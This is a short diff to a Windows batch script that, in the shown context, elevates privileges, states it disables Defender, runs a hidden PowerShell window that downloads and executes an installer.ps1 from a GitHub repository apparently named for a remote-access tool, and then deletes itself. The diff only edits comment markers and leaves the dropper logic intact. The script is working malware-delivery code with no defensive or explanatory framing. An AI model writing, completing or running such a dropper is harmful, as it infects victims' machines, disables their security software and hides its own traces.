@@ -29,9 +29,7 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 :--------------------------------------   
 
-@echo off
-
-@REM disable defender and execute downloaded script
+REM disable defender and execute downloaded script
 powershell -windowstyle hidden -Command ^
 "try { ^
     Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1' -OutFile 'installer.ps1'; ^
@@ -41,6 +39,6 @@ powershell -windowstyle hidden -Command ^
     Write-Error 'An error occurred: ' + $_.Exception.Message; ^
 }"
 
-@REM self delete
+REM self delete
 del "%~f0"
 
